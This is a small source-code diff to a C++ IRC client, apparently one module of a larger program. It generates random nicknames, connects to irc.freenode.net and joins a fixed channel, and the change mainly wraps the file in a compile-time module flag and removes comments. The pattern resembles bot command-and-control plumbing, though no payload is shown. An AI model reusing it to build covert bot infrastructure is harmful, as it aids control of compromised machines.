@@ -2,6 +2,8 @@
 #include "Log.h"
 #include "Config.h"
 #include "Process.h"
+
+#ifdef MODIRC_ENABLED
 #include "IRCClient.h"
 
 using namespace Amendux;
@@ -54,11 +56,6 @@ const char nameAddition[][5] = {
 
 void IRCClient::GenerateNname(char *name) {
 	name[0] = '\0';
-
-	/*if (rand() % 8 == 0) {
-		name[0] = '_';
-		name[1] = '\0';
-	}*/
 
 	if (rand() % 8 == 0) {
 		strcat_s(name, 32, namePostFix[(rand() % asz(namePostFix))]);
@@ -448,11 +445,11 @@ void IRCClient::ChatLoop() {
 DWORD IRCClient::Run()
 {
 	char name[32];
-	srand((unsigned int)time(NULL));
+
 	GenerateNname(name);
 	SetNickName(name);
 
-	if (!Connect("irc.freenode.net")) { // 5.157.85.113
+	if (!Connect("irc.freenode.net")) {
 		return 0;
 	}
 		
@@ -463,7 +460,6 @@ DWORD IRCClient::Run()
 
 	SendPing();
 	JoinChannel("#quenza");
-	// SendChatMessage("#test", "w00t!");
 
 	ChatLoop();
 
@@ -471,3 +467,4 @@ DWORD IRCClient::Run()
 
 	return 42;
 }
+#endif
